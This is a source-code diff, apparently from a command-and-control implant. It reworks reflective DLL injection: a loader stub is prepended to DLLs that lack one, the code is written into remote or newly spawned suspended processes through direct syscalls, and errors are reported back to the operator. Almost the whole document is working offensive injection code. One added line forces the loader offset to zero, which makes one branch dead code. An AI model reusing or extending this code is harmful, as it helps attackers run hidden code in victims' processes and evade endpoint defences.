@@ -316,7 +316,7 @@ Win32Error:
     return FALSE;
 }
 
-DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
+DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
 {
     PRINTF( "Params( %x, %x, %d, %x )\n", hTargetProcess, DllBuffer, DllLength, ctx );
 
@@ -324,15 +324,20 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
     LPVOID   MemParamsBuffer     = NULL;
     LPVOID   MemLibraryBuffer    = NULL;
     LPVOID   ReflectiveLdr       = NULL;
+    LPVOID   FullDll             = NULL;
     LPVOID   MemRegion           = NULL;
     DWORD    MemRegionSize       = 0;
     DWORD    ReflectiveLdrOffset = 0;
+    ULONG    FullDllSize         = 0;
     DWORD    OldProtect          = 0;
+    BOOL     HasRDll             = FALSE;
+    DWORD    ReturnValue         = 0;
 
     if( ! DllBuffer || ! DllLength || ! hTargetProcess )
     {
         PUTS( "Params == NULL" )
-        return FALSE;
+        ReturnValue = -1;
+        goto Cleanup;
     }
 
     if ( ProcessIsWow( hTargetProcess ) ) // check if remote process x86
@@ -353,10 +358,22 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
     }
 
     ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer );
-    if ( ! ReflectiveLdrOffset )
+    ReflectiveLdrOffset = 0;
+    if ( ReflectiveLdrOffset )
     {
-        PUTS( "[-] Couldn't get reflective loader\n" )
-        return FALSE;
+        PUTS( "The DLL has a Reflective Loader already defined" );
+        HasRDll     = TRUE;
+        FullDll     = DllBuffer;
+        FullDllSize = DllLength;
+    }
+    else
+    {
+        PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
+        HasRDll     = FALSE;
+        FullDll     = Instance.Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
+        FullDllSize = DllLdrSize + DllLength;
+        MemCopy( FullDll, DllLdr, DllLdrSize );
+        MemCopy( FullDll + DllLdrSize, DllBuffer, DllLength );
     }
 
     PRINTF( "Reflective Loader Offset => %x\n", ReflectiveLdrOffset );
@@ -374,7 +391,8 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
             {
                 PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
                 PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-                return FALSE;
+                ReturnValue = NtStatus;
+                goto Cleanup;
             }
             else
                 PUTS( "Successful wrote params into remote library memory" );
@@ -383,16 +401,17 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
         {
             PUTS( "NtAllocateVirtualMemory: Failed to allocate memory for parameters" )
             PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-            return FALSE;
+            ReturnValue = -1;
+            goto Cleanup;
         }
     }
 
     // Alloc and write remote library
-    MemLibraryBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, DllLength, PAGE_READWRITE );
+    MemLibraryBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, FullDllSize, PAGE_READWRITE );
     if ( MemLibraryBuffer )
     {
         PUTS( "[+] NtAllocateVirtualMemory: success" );
-        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, DllBuffer, DllLength, &OldProtect ) ) )
+        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &OldProtect ) ) )
         {
             // TODO: check to get the .text section and size of it
             PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );
@@ -413,32 +432,45 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
                 {
                     PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                    return FALSE;
+                    ReturnValue = -1;
+                    goto Cleanup;
                 }
 
-                return TRUE;
+                ReturnValue = 0;
+                goto Cleanup;
             }
             else
             {
                 PUTS("[-] NtProtectVirtualMemory: failed")
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                return FALSE;
+                ReturnValue = -1;
+                goto Cleanup;
             }
         }
         else
         {
-            PUTS( "NtWriteVirtualMemory: Failed to write memory for library" )
+            PRINTF( "NtWriteVirtualMemory: Failed to write memory for library [%x]\n", NtStatus )
             PackageTransmitError( 0x1, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-            return FALSE;
+            ReturnValue = NtStatus;
+            goto Cleanup;
         }
     }
 
     PRINTF( "Failed to allocate memory: %d\n", NtGetLastError() )
+    ReturnValue = -1;
 
-    return FALSE;
+Cleanup:
+    if ( ! HasRDll && FullDll )
+    {
+        MemSet( FullDll, 0, FullDllSize );
+        NtHeapFree( FullDll );
+        FullDll = NULL;
+    }
+
+    return ReturnValue;
 }
 
-DWORD DllSpawnReflective( LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
+DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
 {
     PRINTF( "Params( %x, %d, %x )\n", DllBuffer, DllLength, ctx );
 
@@ -456,8 +488,8 @@ DWORD DllSpawnReflective( LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SI
 
     if ( ProcessCreate( TRUE, NULL, SpawnProc, CREATE_NO_WINDOW | CREATE_SUSPENDED, &ProcessInfo, TRUE, NULL ) )
     {
-        Result = DllInjectReflective( ProcessInfo.hProcess, DllBuffer, DllLength, Parameter, ParamSize, ctx );
-        if ( ! Result )
+        Result = DllInjectReflective( ProcessInfo.hProcess, DllLdr, DllLdrSize, DllBuffer, DllLength, Parameter, ParamSize, ctx );
+        if ( Result != 0 )
         {
             PUTS( "Failed" )
 
